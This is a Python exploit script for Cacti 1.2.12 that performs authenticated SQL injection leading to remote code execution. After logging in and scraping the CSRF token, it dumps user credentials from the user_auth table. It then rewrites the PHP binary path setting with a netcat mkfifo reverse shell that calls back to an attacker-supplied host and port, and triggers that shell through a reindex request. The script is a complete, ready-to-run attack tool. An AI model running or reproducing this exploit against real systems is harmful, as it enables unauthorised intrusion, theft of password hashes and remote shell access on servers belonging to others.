import argparse
import requests
import re
import time

def string_fix(url1):
    if url1[-1] == "/": 
        url1 = url1.rstrip(url1[-1]) 
        return url1
    else:
        return url1


def sql_exploit(url1,username,password,lhost,lport):
    print("Make sure netcat is listening!")
    time.sleep(1)

    url2 = url1 + '/cacti/index.php'

    print("Getting the csrf token!")
    time.sleep(1)

    s = requests.Session() 
    r1 = s.get(url2)
    csrf = r1.text 

    csrf = re.findall("name='__csrf_magic' value=(.*) />",csrf) 
    f_csrf = ''

    for i in csrf:
        for j in i:
            if j == ';':
                break
            else:
                f_csrf = f_csrf + j
    
    f_csrf = f_csrf.replace('"','') 
    print("The csrf is token is: " + f_csrf)
    time.sleep(1)

    data = {'__csrf_magic':f_csrf,'action':'login','login_username':username,'login_password':password}

    print("Logging in")
    time.sleep(1)
    r2 = s.post(url2,data=data) 

    print("Sending payload")
    time.sleep(1)
    url3 = url1 + "/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+"+lhost+"+"+lport+"+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"
    r3 = s.get(url3)

    url4 = url1 + "/cacti/host.php?action=reindex"
    r4 = s.get(url4)



def main():
    parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution') 

    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitcacti.com', required=True) 
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('--lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('--lport', metavar='<lport>', help='Your Listening Port', required=True)
    args = parser.parse_args()

    url1 = args.t
    username = args.u
    password = args.p
    lhost = args.lhost
    lport = args.lport

    url1 = string_fix(url1)
    sql_exploit(url1,username,password,lhost,lport)

main()